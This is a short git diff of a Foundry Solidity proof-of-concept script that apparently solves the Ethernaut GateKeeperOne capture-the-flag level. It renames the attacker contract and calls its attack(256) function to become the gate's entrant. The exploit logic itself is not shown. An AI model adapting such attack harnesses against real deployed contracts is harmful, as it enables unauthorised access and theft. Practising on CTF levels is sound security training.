@@ -2,7 +2,7 @@
 pragma solidity ^0.8.20;
 
 import {Script, console2} from "forge-std/Script.sol";
-import {LockPickingOne} from "../src/13_GateKeeperOne.sol";
+import {GateSkipperOne} from "../src/13_GateKeeperOne.sol";
 
 interface IGateKeeperOne {
     function entrant() external view returns (address);
@@ -20,8 +20,8 @@ contract PoC is Script {
         uint256 deployer = vm.envUint("PRIVATE_KEY");
         vm.startBroadcast(deployer);
 
-        LockPickingOne lockPickingOne = new LockPickingOne(gateOne);
-        lockPickingOne.attack(256);
+        GateSkipperOne gateSkipperOne = new GateSkipperOne(gateOne);
+        gateSkipperOne.attack(256);
 
         console2.log("Entrant: ", IGateKeeperOne(gateOne).entrant());
 
